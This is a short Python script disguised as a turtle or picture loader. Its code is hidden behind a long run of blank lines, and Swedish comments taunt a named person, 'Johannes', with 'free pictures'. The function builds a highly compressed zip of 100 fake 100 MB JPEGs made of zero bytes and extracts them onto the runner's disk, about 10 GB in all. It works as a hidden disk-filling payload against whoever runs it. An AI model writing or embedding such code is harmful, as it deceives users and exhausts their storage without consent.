import zipfile
import os
def laddaturtle():

    


























































    OUTPUT_ZIP = "pictures_10gb.zip"
    # Read Me !!!!

    # Du får gratis 10 gb av bilder😊😊 varsogod Johannes!!!(Bli inte sur om det funkar, du borde förväntat dig sånt här tidigare...)

    # Read Me !!!!

    Antalfil = 100
    Filstorlek = 100 * 1024 * 1024 
    TOTAL_GB = (Antalfil * Filstorlek) / (1024 ** 3)
    
    JPEG_HEADER = bytes([
        0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46,
        0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01,
        0x00, 0x01, 0x00, 0x00,
    ])
    JPEG_FOOTER = bytes([0xFF, 0xD9])
    
    FILLER = b"\x00" * (Filstorlek - len(JPEG_HEADER) - len(JPEG_FOOTER))
    FAKE_JPEG = JPEG_HEADER + FILLER + JPEG_FOOTER
    

    with zipfile.ZipFile(OUTPUT_ZIP, "w", compression=zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
        for i in range(1, Antalfil + 1):
            filename = f"pictures/photo_{i:04d}.jpg"
            zf.writestr(filename, FAKE_JPEG)
    

    # Här kommer filerna
    zip_size_mb = os.path.getsize(OUTPUT_ZIP) / (1024 ** 2)
    with zipfile.ZipFile(OUTPUT_ZIP, "r") as zf:
        zf.extractall("What illegal gambling??!")
